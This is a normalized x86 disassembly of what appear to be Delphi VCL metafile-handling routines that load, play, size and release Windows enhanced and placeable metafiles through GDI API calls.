mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_426b18
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_426b40
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_426c47
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_404208
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_42619c
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403254
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426bc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c4e
lea eax [ ebp - 0x48 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_426bce
mov eax [ ebp - 0x4 ]
call sub_403254
call sub_403a08
call sub_403a5c
mov eax [ ebx + 0xc ]
call sub_403254
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c4e
lea eax [ ebp - 0x48 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403468
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_426c58
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4031a4
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402b58
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_426cb4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_426d30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_426b40
mov eax [ ebp - 0x8 ]
push eax
push sub_426c58
push ebp
call sub_426cb4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426dac
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_422718
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_426dec
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426e5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_4272bc
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_427324
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
xor edx edx
mov eax esi
call sub_426e84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e63
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
add esp 0xfffffff0
call sub_403578
sub_426e63
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_426e84
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_427090
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423de4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403578
xor edx edx
push ebp
push sub_427073
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427438
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427420
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427420
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427438
mov ecx eax
xor edx edx
xor eax eax
call sub_41919c
mov eax ebx
call sub_404264
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
push 0x8
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
call sub_40651c
mov edx eax
mov eax edi
call sub_427a98
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427a98
jmp r-xdata
push ebx
push r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404324
mov eax [ ebp - 0x20 ]
call sub_404464
jmp r-xdata
mov eax esi
call sub_404264
test eax eax
jle r-xdata
push 0xa
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call sub_40651c
mov edx eax
mov eax edi
call sub_427a5c
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427a5c
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call CreateEnhMetaFileA
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424618
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42707a
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
call sub_4248e8
retn
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
sub_427097
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4270cb
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
call sub_4035e0
mov ebx edx
mov edi eax
mov eax edi
call sub_424598
mov esi eax
xor edx edx
mov eax edi
call sub_424618
push esi
call CloseEnhMetaFile
mov edx eax
mov eax [ edi + 0x58 ]
call sub_427958
mov edx ebx
and dl 0xfc
mov eax edi
call sub_423ea8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c8
sub_427120
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_425b10
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_427168
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428314
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ab9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_427198
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_428314
mov edx esi
mov eax ebx
call sub_41abc8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_428310
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_42722c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_424598
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_424598
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_424598
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_424598
push eax
call SelectPalette
sub_4272bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403fa4
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax esi
mov edx edi
call sub_4045f0
mov eax [ esi ]
call sub_404464
push eax
push edi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ esi ]
call sub_404464
call sub_408bb4
mov edx eax
mov eax esi
call sub_4045f0
sub_427324
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403fa4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax ebx
mov edx edi
call sub_4045f0
mov eax [ ebx ]
call sub_404464
push eax
push edi
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ ebx ]
call sub_404464
call sub_408bb4
mov ecx eax
inc ecx
mov eax ebx
mov edx 0x1
call sub_404504
mov eax [ ebx ]
call sub_404464
call sub_408bb4
mov edx eax
mov eax ebx
call sub_4045f0
sub_4273bc
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427594
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_40651c
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_40651c
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427450
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_422718
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_4274dc
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427594
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_40651c
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_40651c
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427540
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_427b4c
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41c264
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_4276f8
mov edx esi
mov eax ebx
call sub_427628
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_427594
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_428314
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_428310
pop esi
pop ebx
retn
sub_4275bc
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_427b4c
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_4276f8
mov edx esi
mov eax ebx
call sub_427628
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_427628
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_427594
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41c490
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4027c4
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4276e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4029c0
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41c490
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424888
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4276ef
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4027e4
retn
call sub_424888
sub_4276f8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_427594
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_424888
lea eax [ ebp - 0x22 ]
call sub_4256d8
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call sub_40651c
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call sub_40651c
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4027c4
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_427867
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424888
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42786e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4027e4
retn
call sub_424888
sub_427878
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42791f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4278fd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408abc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c984
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425ddc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427904
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_427958
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_427bac
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esp
push 0x64
push esi
call GetEnhMetaFileHeader
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_422718
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] esi
xor edx edx
mov [ eax + 0x1c ] edx
xor edx edx
mov [ eax + 0x20 ] edx
test esi esi
je r-xdata
push eax
call DeleteEnhMetaFile
call sub_424888
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esp 0x64
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
mov [ eax + 0x10 ] edx
sub_4279e8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427594
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_40651c
mov edx eax
mov eax ebx
call sub_427a5c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call sub_40651c
mov edx eax
mov eax ebx
call sub_427a5c
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427a5c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_427594
pop esi
pop ebx
retn
mov eax ebx
call sub_427bac
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427a98
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_427594
pop esi
pop ebx
retn
mov eax ebx
call sub_427bac
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427ad8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427594
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_40651c
mov edx eax
mov eax ebx
call sub_427a98
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call sub_40651c
mov edx eax
mov eax ebx
call sub_427a98
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427b4c
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41c264
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
